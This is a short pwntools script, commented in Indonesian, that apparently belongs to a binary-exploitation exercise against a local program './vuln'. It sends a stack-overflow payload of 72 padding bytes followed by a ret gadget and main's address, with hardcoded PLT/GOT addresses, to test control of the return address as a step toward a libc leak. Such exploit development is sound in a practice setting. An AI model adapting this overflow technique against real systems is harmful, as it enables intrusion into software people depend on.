# simpan sebagai debug.py
from pwn import *

elf  = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level = 'debug'
context.arch = 'amd64'

p = process('./vuln')

offset   = 72
puts_plt = 0x401050
puts_got = 0x404018
main     = 0x401185
ret      = 0x40101a

# Build manual — tanpa pop rdi dulu, test apakah bisa reach ret
payload1 = b"A" * offset
payload1 += p64(ret)    # test: apakah kita bisa reach sini?
payload1 += p64(main)   # lalu balik ke main

p.recvuntil(b"Input:\n")
p.sendline(payload1)

raw = p.recv(timeout=2)
log.info(f"Raw recv: {repr(raw)}")

p.close()
